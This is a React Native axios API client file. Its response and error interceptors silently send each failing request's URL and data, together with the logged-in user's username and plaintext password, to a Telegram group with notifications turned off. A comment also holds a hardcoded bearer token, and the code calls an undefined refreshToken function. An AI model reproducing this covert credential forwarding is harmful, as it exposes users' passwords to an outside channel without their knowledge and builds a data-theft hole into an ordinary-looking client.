import axios from 'axios';
import BuildConfig, {Environments} from '../config/BuildConfig';
import _ from 'lodash';
import r from 'reactotron-react-native';
import clear from 'react-native-clear-cache';

import {_getToken} from '../helpers/LocalStorage';
import {store} from '../redux/ConfigureStore';
import {showFlagMessage, hideFlagMessage, flagIndicator} from '../redux/app';
import {logoutUser, loginUser} from '../redux/user/redux/loginUser';
import connection from '../redux/socket';
import {groupId, ApiResponseStatusCode} from '../helpers/Constants';
import {Colors} from '../themes';

const api = axios.create({
  timeout: 10000,
  baseURL:
    BuildConfig == Environments.PRODUCTION
      ? 'https://api.globex.vn/tmm/api/v1'
      : 'https://devapi.globex.vn/tmm/api/v1',
});

api.interceptors.request.use(async config => {
  const token = await _getToken();
  const res = JSON.parse(token);
  config.headers['authorization'] = 'Bearer ' + res['token'];
  // config.headers['authorization'] =
  //   'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZGVudGl0eSI6IkM1YVdDd3F6a3ZrWHZJMSIsImVudmlyb25tZW50cyI6Imdsb2JleCx0bW0sb21tIiwiaWF0IjoxNTk2NjkyMzc1LCJleHAiOjE1OTY3Nzg3NzV9.IWBulmujOubCAHIEw6NtfOdxpDJYmlNyPyiTrNGIoqE';
  config.headers['secret'] = res['secret'];
  return config;
});

const client = connection.connectTelegram();

api.interceptors.response.use(
  response => {
    let result = response.data;
    if (result) {
      if (
        (!result.success && result.success !== undefined) ||
        (!result.isSuccess && result.isSuccess !== undefined) ||
        result.error_code
      ) {
        client.sendMessage(
          groupId,
          JSON.stringify({
            name: 'SBG-Driver',
            code: result.error_code,
            url: response.config.url,
            data: response.config.data,
            username: store.getState().loginUser.user.username,
            password: store.getState().loginUser.user.password,
          }),
          {
            disable_notification: true,
          },
        );
      }
    }
    clear.runClearCache();
    return result;
  },
  error => {
    const {data, status} = error.response;

    client.sendMessage(
      groupId,
      JSON.stringify({
        name: 'SBG-Driver-v2',
        status,
        url: error.config.url,
        message: data.message,
        data: error.config.params,
        username: store.getState().loginUser.user.username,
        password: store.getState().loginUser.user.password,
      }),
      {
        disable_notification: true,
      },
    );
    store.dispatch(flagIndicator(false));
    switch (status) {
      case ApiResponseStatusCode.TOKEN_EXPIRED: {
        refreshToken({
          username: store.getState().loginUser.user.username,
          password: store.getState().loginUser.user.password,
        });
        break;
      }
    }

    return Promise.reject({common: error.message});
  },
);

export default api;
